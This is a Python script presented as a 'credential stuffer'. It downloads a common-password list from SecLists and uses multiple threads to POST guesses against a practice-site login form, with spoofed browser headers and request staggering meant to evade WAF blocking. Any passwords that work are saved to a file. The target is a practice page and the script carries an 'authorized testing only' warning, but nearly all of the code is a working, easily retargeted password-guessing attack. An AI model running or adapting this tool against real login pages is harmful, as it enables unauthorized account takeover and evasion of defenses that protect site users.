import time
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from concurrent.futures import ThreadPoolExecutor, as_completed

# ==========================================
# CONFIGURATION
# ==========================================
# The raw URL to the SecLists text file on GitHub
SECLISTS_URL = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt"
PASSWORDS_TO_TEST = 10  # Limit to the first 10 passwords from the list

# Target Configuration
TARGET_URL = "https://practicetestautomation.com/practice-test-login/"
USERNAME_FIELD = 'username'
PASSWORD_FIELD = 'password'
SUCCESS_INDICATOR = "Logged In Successfully"
TARGET_USERNAME = "student" # The username we will test the passwords against

# SPOOFED HEADERS
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "https://practicetestautomation.com",
    "Referer": TARGET_URL
}
# ==========================================

def get_robust_session():
    """Builds an HTTP session with connection pooling and automatic retries."""
    session = requests.Session()
    session.headers.update(HEADERS)
    
    retry_strategy = Retry(
        total=3,
        backoff_factor=0.5,
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=["POST", "GET"]
    )
    adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=10, pool_maxsize=10)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    
    return session

def fetch_dynamic_wordlist(session, url, limit):
    """Fetches the latest wordlist directly from the SecLists GitHub repository."""
    print(f"[*] Fetching the latest wordlist from SecLists...")
    try:
        response = session.get(url, timeout=10)
        response.raise_for_status() # Ensure we got a 200 OK
        
        # Split the raw text by newlines and slice the array to the requested limit
        passwords = response.text.splitlines()[:limit]
        
        print(f"[+] Successfully loaded {len(passwords)} passwords from the repository.\n")
        return passwords
        
    except requests.exceptions.RequestException as e:
        print(f"[-] FATAL: Failed to download wordlist from GitHub. {e}")
        return []

def check_server_alive(session, url):
    """Checks if the target server is online before attacking."""
    print("[*] Checking if target server is online...")
    try:
        res = session.get(url, timeout=5)
        if res.status_code == 200:
            print("[+] Target server is online. Commencing scan...\n")
            return True
    except requests.exceptions.RequestException:
        print("[-] SERVER IS OFFLINE OR BLOCKING YOU. The scan cannot proceed.")
        return False

def web_login(session, url, username, password):
    """Attempts to log into the web form via HTTP POST."""
    try:
        payload = {
            USERNAME_FIELD: username,
            PASSWORD_FIELD: password
        }
        
        response = session.post(url, data=payload, timeout=10)

        # Check for the positive success indicator
        if SUCCESS_INDICATOR in response.text:
            print(f"[+] SUCCESS | Username: {username:<8} | Password: {password}")
            with open("web_credentials_found.txt", "a") as fh:
                fh.write(f"Username: {username}\nPassword: {password}\nWorked on URL: {url}\n")
            return True
        else:
            print(f"[-] FAILED  | Username: {username:<8} | Password: {password}")
            return False
            
    except requests.exceptions.RequestException as e:
        print(f"[*] ERROR connecting for {username} - {e}")
        return False

def main():
    print("--- Dynamic SecLists Credential Stuffer ---")
    print("WARNING: Authorized testing environments only.")
    print(f"Targeting: {TARGET_URL}\n")
    
    session = get_robust_session()
    
    # 1. Fetch the passwords from GitHub
    password_list = fetch_dynamic_wordlist(session, SECLISTS_URL, PASSWORDS_TO_TEST)
    if not password_list:
        return
    
    # 2. Check if the target is alive
    if not check_server_alive(session, TARGET_URL):
        return
    
    # 3. Fire the payloads
    with ThreadPoolExecutor(max_workers=3) as executor:
        futures = []
        for password in password_list:
            # We are testing the fetched passwords against the 'student' username
            futures.append(executor.submit(web_login, session, TARGET_URL, TARGET_USERNAME, password))
            time.sleep(0.5) # Stagger to avoid immediate WAF blocking

        for future in as_completed(futures):
            future.result()
            
    print("\n[*] Scan complete.")

if __name__ == "__main__":
    main()
